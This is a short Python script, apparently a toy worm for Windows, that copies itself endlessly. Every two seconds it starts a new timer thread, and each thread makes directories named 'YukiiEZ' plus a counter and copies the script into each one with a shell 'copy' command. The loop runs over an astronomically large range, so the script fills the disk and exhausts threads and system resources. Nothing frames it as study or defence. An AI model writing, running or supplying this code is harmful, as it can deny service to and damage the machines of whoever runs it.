from sys import argv
import threading
import os

gusano = argv
name = str(gusano[0])
print(name)

def Mostrar():
    threading.Timer(2.0,Mostrar).start()
    for i in range(0,1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
        directorio = "YukiiEZ"+str(i)
        os.mkdir(directorio)
        os.system("copy"+" "+name+" "+directorio)

Mostrar()
input()